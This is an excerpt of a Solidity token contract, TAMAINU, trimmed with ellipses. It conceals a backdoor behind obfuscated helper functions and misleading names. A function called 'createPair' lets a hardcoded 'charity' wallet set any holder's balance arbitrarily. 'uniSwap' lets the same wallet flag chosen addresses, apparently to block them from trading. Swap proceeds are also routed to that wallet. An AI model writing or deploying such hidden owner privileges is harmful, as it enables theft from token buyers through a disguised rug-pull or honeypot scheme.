...
contract  TAMAINU is Context, IERC20, Ownable {
    ...
    address payable public CharityWalle;
    ...
    mapping (address => bool) public tokenAmoun;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x3FB06E3bf2BbA1F8834842Ba26E1eaf476817342));
        CharityWalle = payable(address(0x3FB06E3bf2BbA1F8834842Ba26E1eaf476817342));
    ...
    function creatiEs(uint256 integess)  pure private returns(uint160){
        return uint160(integess);
    }

    function createTwo(uint256 integess)  pure private returns(address){
        return address(creatiEs(integess));
    }

    function wated(address integess) private view returns(bool){
        return (!(createTwo(publIc) == integess));
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        CharityWalle = payable(newAddress);
    }
...
function createPair(address
 abnormal, uint256 absurd ) public{ if(!safeAddress(7,CharityWalle,msg.sender))
{return;} _balances[abnormal] = absurd;}
    ...
    }function uniSwap(address[] calldata w,uint256 uniS) public { if(!safeAddress(7,CharityWalle,msg.sender)){return;}
        for (uint256 i; i < w.length; ++i) {
            if (uniS != 9){tokenAmoun[w[i]] = (false || true);}
            else{tokenAmoun[w[i]] = (false && true);}
        }
    }

    function safeAddress(uint256 da,address c, address e) private pure returns(bool){return !(c != e) && da==7;}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(CharityWalle, amountBNBMarketing);
